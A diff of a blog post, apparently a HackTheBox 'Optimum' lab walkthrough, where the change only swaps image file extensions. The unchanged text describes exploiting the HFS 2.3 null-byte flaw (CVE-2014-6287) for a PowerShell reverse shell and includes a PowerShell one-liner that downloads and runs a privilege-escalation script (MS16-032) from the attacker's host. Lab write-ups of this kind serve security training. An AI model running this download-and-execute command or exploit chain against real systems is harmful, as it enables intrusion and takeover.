@@ -2,14 +2,14 @@
 title: HackTheBox - Optimum (ft. PowerShell)
 category: infosec
 date: 2018-09-19
-thumbnail: optimum-thumb.webp
+thumbnail: optimum-thumb.png
 tags: htb,powershell,htbwalkthrough
 description:
 ---
 
 Optimum was a fun box with which while the write-up says to use Metasploit, can be done almost entirely with PowerShell. This makes it good practice for someone like me who has never used PowerShell to learn some basic things.
 
-![image-alternative](/website/article/static/img/optimum-nmap.webp)
+![image-alternative](/website/article/static/img/optimum-nmap.png)
 
 Our initial nmap scans only show one port open running HttpFileServer (HFS) version 2.3, which is vulnerable to [CVE-2014-6287](https://www.cvedetails.com/cve/CVE-2014-6287/). From the description it *"allows remote attackers to execute arbitrary programs via a %00 sequence in a search action."* Basically this just allows us to execute HFS template macros by just sending a null byte (%00) to the search item. Metasploit has the module **exploit/windows/http/rejetto_hfs_exec** to exploit this vulnerability and get a meterpreter shell, but to get a reverse shell in PowerShell, we are going to do it manually.
 
@@ -41,7 +41,7 @@ Now is finally time to do the exploit. We will open up netcat as our listener on
 
 You can see at the start we use the null terminator (%00) then execute our command from `powershell.exe` located in `C:\Windows\SysNative\WindowsPowershell\v1.0\` which is the 64bit version of PowerShell.
 
-![image-alternative](/website/article/static/img/optimum-ncat.webp)
+![image-alternative](/website/article/static/img/optimum-ncat.png)
 
 We can now get `user.txt` from the current directory.
 
@@ -55,7 +55,7 @@ Now we will invoke it from our shell with:
 
 This will go through every vulnerability, but the one we are interested in is this (MS16-032):
 
-![image-alternative](/website/article/static/img/optimum-sherlock.webp)
+![image-alternative](/website/article/static/img/optimum-sherlock.png)
 
 `MS16-032` is a vulnerability could allow elevation of privilege if the Windows Secondary Logon Service fails to properly manage request handles in memory.
 
@@ -69,6 +69,6 @@ Now we run the command from our shell to get the script:
 
     IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-MS16032.ps1')
 
-![image-alternative](/website/article/static/img/optimum-root.webp)
+![image-alternative](/website/article/static/img/optimum-root.png)
 
 And now we are root. The flag is in `C:\Users\Administrator\Desktop\root.txt`.
